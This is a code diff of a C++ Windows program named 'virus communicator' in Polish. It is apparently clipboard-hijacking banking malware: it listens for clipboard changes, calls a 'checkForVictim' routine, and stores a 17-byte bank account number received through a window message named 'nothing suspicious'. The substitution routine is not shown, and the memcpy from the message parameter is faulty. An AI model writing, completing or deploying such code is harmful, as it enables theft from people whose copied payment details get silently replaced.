@@ -1,7 +1,12 @@
 #include "main.h"
 
-const char szClassName[] = "KomunikatorWirusa";
+constexpr char szClassName[] = "KomunikatorWirusa";
+constexpr char windowTitle[] = "Komunikator Wirusa";
+constexpr char msgName[] = "Nic podejrzanego";
 HWND hwndThis;
+UINT messageCode;
+LPSTR bankAccount;
+bool bAset;
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
@@ -38,10 +43,13 @@ bool init(HINSTANCE hInstance)
 
 	hwndThis = CreateWindowEx(
 		NULL,
-		szClassName,
-		"",
-		WS_DISABLED,
-		0, 0, 0, 0,
+		wc.lpszClassName,
+		windowTitle,
+		WS_CAPTION | WS_VISIBLE,
+		CW_USEDEFAULT,
+		CW_USEDEFAULT,
+		CW_USEDEFAULT,
+		CW_USEDEFAULT,
 		NULL,
 		NULL,
 		hInstance,
@@ -51,12 +59,54 @@ bool init(HINSTANCE hInstance)
 	if (hwndThis == NULL) return false;
 	if (!AddClipboardFormatListener(hwndThis)) return false;
 
-	messageCode = RegisterWindowMessage((LPCSTR)"Nic podejrzanego");
+	messageCode = RegisterWindowMessage(msgName);
 
 
-	bankAccount = (char*)malloc(17 * sizeof(char));
+	bankAccount = (LPSTR)malloc(17 * sizeof(char));
 	bAset = false;
-	time(&start);
 
 	return true;
+}
+
+LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
+{
+	if (msg == messageCode)
+	{
+		switch (wParam)
+		{
+		case 1:
+			memcpy(bankAccount, &lParam, 17);
+			bAset = true;
+			break;
+		}
+	}
+	switch (msg)
+	{
+	case WM_CREATE:
+		hwndNextViewer = SetClipboardViewer(hwnd);
+		break;
+	case WM_CLIPBOARDUPDATE:
+		checkForVictim();
+		if (hwndNextViewer != NULL)
+			SendMessage(hwndNextViewer, msg, wParam, lParam);
+		break;
+	case WM_CHANGECBCHAIN:
+		if ((HWND)wParam == hwndNextViewer)
+			hwndNextViewer = HWND(lParam);
+		else
+			if (hwndNextViewer != NULL)
+				SendMessage(hwndNextViewer, msg, wParam, lParam);
+		break;
+	case WM_CLOSE:
+		DestroyWindow(hwnd);
+		break;
+	case WM_DESTROY:
+		ChangeClipboardChain(hwnd, hwndNextViewer);
+		RemoveClipboardFormatListener(hwnd);
+		PostQuitMessage(0);
+		break;
+	default:
+		return DefWindowProc(hwnd, msg, wParam, lParam);
+	}
+	return 0;
 }
